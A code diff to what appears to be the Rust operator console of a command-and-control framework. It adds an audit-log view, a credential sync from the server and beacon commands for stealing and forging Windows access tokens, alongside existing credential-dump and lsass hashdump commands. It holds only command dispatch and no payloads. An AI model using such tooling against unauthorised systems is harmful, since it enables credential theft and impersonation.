@@ -58,6 +58,7 @@ pub(super) enum Overlay {
     Files(Vec<FileEntry>),
     Procs(Vec<ProcEntry>),
     Creds(Vec<CredEntry>),
+    Audit(Vec<crate::rest::AuditRow>),
     Sessions(ListState),
 }
 
@@ -189,6 +190,14 @@ impl App {
                                 self.log(&format!("credstore: +{added} new (total {})", self.creds.entries.len()), Level::Ok);
                             }
                             Overlay::Creds(rows)
+                        }
+                    }
+                    ParsedTable::Audit(rows) => {
+                        if rows.is_empty() {
+                            self.log("(audit log empty)", Level::Warn);
+                            Overlay::None
+                        } else {
+                            Overlay::Audit(rows)
                         }
                     }
                 };
@@ -636,6 +645,7 @@ impl App {
                 // /creds                 — 列出整个凭据库
                 // /creds export json|csv — 导出
                 // /creds find <query>    — 搜索（kind:hash / user:admin）
+                // /creds sync [reveal]   — 从 server /api/creds 拉取并入库
                 // /creds <shell cmd>     — 跑 shell dump，结果解析后入库
                 let sub = args.trim();
                 if sub == "export json" {
@@ -659,7 +669,7 @@ impl App {
                     }
                 } else if sub == "list" || sub.is_empty() {
                     if self.creds.entries.is_empty() {
-                        self.log("(credstore empty — run a cred dump BOF first)", Level::Warn);
+                        self.log("(credstore empty — run a cred dump BOF or /creds sync first)", Level::Warn);
                     } else {
                         let rows: Vec<CredEntry> = self.creds.entries.iter().map(|c| CredEntry {
                             source: c.source.clone(),
@@ -669,10 +679,34 @@ impl App {
                         }).collect();
                         self.overlay = Overlay::Creds(rows);
                     }
+                } else if sub == "sync" || sub.starts_with("sync ") {
+                    let reveal = sub.contains("reveal");
+                    self.send(Cmd::FetchCreds { reveal });
                 } else {
                     // 当作 shell 命令跑，结果解析后入库
                     self.run_parsed_shell(sub, "/creds", ShellFor::Creds);
                 }
+            }
+            "/audit" => {
+                // /audit                       — 全量审计日志
+                // /audit operator <name>       — 按操作员过滤
+                // /audit action <task|cred_*>  — 按动作过滤
+                // /audit limit <n>             — 限制条数
+                let mut filters: Option<String> = None;
+                let mut operator: Option<String> = None;
+                let mut action: Option<String> = None;
+                let mut limit: Option<u32> = None;
+                let mut it = args.split_whitespace();
+                while let Some(k) = it.next() {
+                    match k {
+                        "operator" => operator = it.next().map(|s| s.to_string()),
+                        "action" => action = it.next().map(|s| s.to_string()),
+                        "limit" => limit = it.next().and_then(|s| s.parse().ok()),
+                        _ => { filters = Some(k.to_string()); }
+                    }
+                }
+                let _ = filters;
+                self.send(Cmd::FetchAudit { operator, action, limit });
             }
             "/connect" => {
                 let mut parts = args.split_whitespace();
@@ -919,6 +953,53 @@ impl App {
                     _ => 0, // 默认 lsass
                 };
                 self.send(Cmd::Hashdump { session: s.id, method });
+            }
+            "/getuid" => {
+                let Some(s) = self.current_session().cloned() else {
+                    self.log("! select a beacon first", Level::Err); return;
+                };
+                self.send(Cmd::GetUid { session: s.id });
+            }
+            "/steal" => {
+                let Some(s) = self.current_session().cloned() else {
+                    self.log("! select a beacon first", Level::Err); return;
+                };
+                let pid: u32 = match args.trim().parse() {
+                    Ok(v) => v,
+                    _ => { self.log("usage: /steal <pid>", Level::Warn); return; }
+                };
+                self.send(Cmd::StealToken { session: s.id, pid });
+            }
+            "/make_token" => {
+                let Some(s) = self.current_session().cloned() else {
+                    self.log("! select a beacon first", Level::Err); return;
+                };
+                // /make_token DOMAIN\user password [logon_type 1|2|3]
+                let parts: Vec<&str> = args.split_whitespace().collect();
+                if parts.len() < 2 {
+                    self.log("usage: /make_token DOMAIN\\user password [1|2|3]", Level::Err);
+                    return;
+                }
+                let du = parts[0];
+                let (domain, user) = match du.split_once('\\') {
+                    Some((d, u)) => (d.to_string(), u.to_string()),
+                    None => (String::new(), du.to_string()), // local account
+                };
+                let password = parts[1].to_string();
+                let logon_type = parts.get(2).and_then(|t| t.parse::<u8>().ok()).unwrap_or(1);
+                self.send(Cmd::MakeToken {
+                    session: s.id,
+                    domain,
+                    user,
+                    password,
+                    logon_type,
+                });
+            }
+            "/rev2self" => {
+                let Some(s) = self.current_session().cloned() else {
+                    self.log("! select a beacon first", Level::Err); return;
+                };
+                self.send(Cmd::Rev2Self { session: s.id });
             }
             "/cd" | "/mkdir" | "/rm" => {
                 let (op, path) = self.fileop_one_arg(name, args);
